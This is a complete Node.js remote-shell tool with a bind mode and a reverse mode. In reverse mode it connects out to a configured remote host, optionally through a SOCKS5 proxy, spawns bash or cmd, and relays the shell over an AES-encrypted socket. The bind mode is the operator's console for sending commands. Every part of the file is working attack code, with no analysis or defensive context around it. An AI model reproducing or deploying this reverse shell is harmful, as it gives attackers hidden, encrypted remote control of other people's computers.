const { createConnection } = require("net");
const createSocksConnection = require("socks").SocksClient.createConnection
const { createInterface } = require("readline")
const { spawn } = require("child_process")
const { CryptorAES } = require('./crypt')
const yargs = require("yargs");

//convert text to encrypted buffer
function translate_out(cleartext) {
    const buffer = Buffer.from(cleartext, 'utf-8')
    const encrypted = crypt.encrypt(buffer)
    return (encrypted)
}

//convert encrypted buffer to text
function translate_in(encBuff) {
    const decrypted = crypt.decrypt(encBuff).toString('utf-8')
    return (decrypted)
}

// Bind shell
function Bind(config) {
    if ("proxy" in config) {
        createSocksConnection(config, (err, data) => {
            if (!err) {
                const socket = data.socket

                const int = createInterface({
                    input: process.stdin,
                    output: process.stdout
                })

                int.on("line", (data) => {
                    socket.write(translate_out(data))
                })

                int.on("SIGINT", () => {
                    socket.end()
                    process.exit(0)
                })

                socket.on("connect", () => {
                    console.log("Connected")
                })

                socket.on("data", (data) => {
                    console.log(translate_in(data))
                })

                socket.on("error", (err) => {
                    switch (err.code) {
                        case "ECONNRESET":
                            console.log("INFO:Server connection reset.")
                            process.exit(1)
                        default:
                            console.log(`ERROR:${err}`)
                            break
                    }
                    console.log(err)
                })

                process.on("SIGINT", () => {
                    process.exit()
                })
            } else {
                console.log(err)
            }
        })
    } else {
        const client = createConnection(config, () => {
            const int = createInterface({
                input: process.stdin,
                output: process.stdout
            })

            int.on("line", (data) => {
                client.write(translate_out(data))
            })

            int.on("SIGINT", () => {

                client.end()
            })

            client.on("data", (data) => {
                console.log(translate_in(data))
            });

            client.on("error", (data) => {
                switch (data.code) {
                    case "ECONNRESET":
                        console.log("INFO:Server connection reset.")
                        process.exit(1)
                    default:
                        console.log(`ERROR:${data}`)
                        break
                }
            })

            client.on("end", () => {
                console.log("INFO:Disconnected from server");
                process.exit(0)
            });
        });
    }
}

// Reverse shell
function Reverse(config) {
    if ("proxy" in config) {
        createSocksConnection(config, (err, data) => {
            if (!err) {
                const socket = data.socket
                let shellcmd = undefined
                switch (process.platform) {
                    case "linux":
                        shellcmd = "bash"
                        break
                    case "android":
                        shellcmd = "bash"
                        break
                    case "win32":
                        shellcmd = "cmd"
                        break
                }

                const shell = spawn(shellcmd)

                // shell stdout to client
                shell.stdout.on("data", (data) => {
                    socket.write(translate_out(data))
                })

                shell.stderr.on("data", (error) => {
                    socket.write(translate_out(error))
                })

                socket.on("exit", () => {
                    process.exit(0)
                })

                socket.on("data", (data) => {
                    shell.stdin.write(`${translate_in(data)}\n`)
                })


                socket.on("error", (data) => {
                    switch (data.code) {
                        case "ECONNRESET":
                            process.exit(1)
                        default:
                            console.log(`ERROR:${data}`)
                            process.exit(1)
                    }
                })

                socket.on("end", () => {
                    console.log("INFO:Disconnected from server");
                    process.exit(0)
                });
            } else {
                console.log(err)
            }
        })
    } else {
        const client = createConnection(config, () => {
            let shellcmd = undefined
            switch (process.platform) {
                case "linux":
                    shellcmd = "bash"
                    break
                case "android":
                    shellcmd = "bash"
                    break
                case "win32":
                    shellcmd = "cmd"
                    break
            }

            const shell = spawn(shellcmd)

            // shell stdout to client
            shell.stdout.on("data", (data) => {
                client.write(translate_out(data))
            })

            shell.stderr.on("data", (error) => {
                client.write(translate_out(error))
            })

            shell.on("exit", () => {
                process.exit(0)
            })

            client.on("data", (data) => {
                shell.stdin.write(`${translate_in(data)}\n`)
            })


            client.on("error", (data) => {
                switch (data.code) {
                    case "ECONNRESET":
                        process.exit(1)
                    default:
                        console.log(`ERROR:${data}`)
                        process.exit(1)
                }
            })

            client.on("end", () => {
                console.log("INFO:Disconnected from server");
                process.exit(0)
            });
        });
    }

}


const argv = yargs
    .option('opmode', {
        alias: 'o',
        desc: 'Op mode. Accepted values "[b]ind or [r]everse mode. Defaults to bind.',
        type: 'string',
        default: 'b',
        demandOption: true,
        choices: ['b', 'r']
    })
    .option('configfile', {
        alias: 'c',
        desc: 'Config file for connection details',
        type: 'string',
        demandOption: true
    })
    .argv


let connection_info
let crypt

if (argv.configfile !== undefined) {
    const configfile = require(`./${argv.configfile}`)
    crypt = new CryptorAES(configfile.aes_password, configfile.aes_iv)
    if (configfile.use_socks_proxy === true) {
        connection_info = {
            command: "connect",
            proxy: {
                host: configfile.proxy_address.toString(),
                port: parseInt(configfile.proxy_port),
                type: 5 // Socks version (4 or 5)
            },
            destination: {
                host: configfile.remote_address.toString(),
                port: parseInt(configfile.remote_port)
            },
        }
        configfile.aes_password, configfile.aes_iv
    } else {
        connection_info = {
            host: configfile.remote_address.toString(),
            port: parseInt(configfile.remote_port)
        }
    }
}

switch (argv.opmode) {
    case 'b':
        Bind(connection_info)
        break
    case 'r':
        Reverse(connection_info)
        break
    default:
        console.log("ERROR")
        process.exit(1)
}